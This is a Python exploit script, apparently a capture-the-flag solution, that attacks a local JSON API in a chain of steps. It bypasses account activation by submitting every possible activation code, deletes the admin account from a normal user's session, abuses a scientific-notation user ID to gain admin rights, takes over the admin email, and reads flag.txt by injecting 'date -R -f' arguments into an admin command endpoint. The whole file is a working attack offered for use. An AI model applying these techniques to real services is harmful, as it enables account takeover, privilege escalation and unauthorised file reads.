import requests
import json
from random import randint


url = "http://localhost/json_api"


def sendApiRequest(action, data, session=None):
    if session is None:
        session = requests.Session()
    r = session.post(url, data=json.dumps({
        "action": action,
        "data": data
    }))
    return r.text


def main():
    normal_user = f"{randint(0, 100000)}@foo.bar"
    password = "supersecure"
    all_activation_ids = [f"{i:04}" for i in range(10000)]
    new_admin_user = f"{randint(0, 100000)}@foo.bar"
    admin_user = "admin@cscg.de"
    print("Using normal user email:", normal_user)
    print("Using new admin user email:", new_admin_user)

    resp = sendApiRequest("create_account", {
        "email": normal_user,
        "password": password,
        "groupid": "001",
        "userid": f"{randint(0, 9999):04}",
        "activation": all_activation_ids
    })
    print("Create normal account:", resp)

    session = requests.Session()
    resp = sendApiRequest("login", {
        "email": normal_user,
        "password": password
    }, session)
    print("Login:", resp)

    resp = sendApiRequest("delete_account", {
        "email": normal_user,
        "admin_email": admin_user
    }, session)
    print("Delete accs:", resp)

    resp = sendApiRequest("create_account", {
        "email": new_admin_user,
        "password": password,
        "groupid": "001",
        "userid": f"1e{randint(20, 99)}",
        "activation": all_activation_ids
    })
    print("Create new admin:", resp)

    session = requests.Session()
    resp = sendApiRequest("login", {
        "email": new_admin_user,
        "password": password
    }, session)
    print("Login with new admin:", resp)

    resp = sendApiRequest("edit_account", {
        "email": admin_user
    }, session)
    print("Edit email", resp)

    resp = sendApiRequest("admin", {
        "cmd": ["date", "-R", "-f", "flag.txt"]
    }, session)
    print("Get flag", resp)


if __name__ == "__main__":
    main()
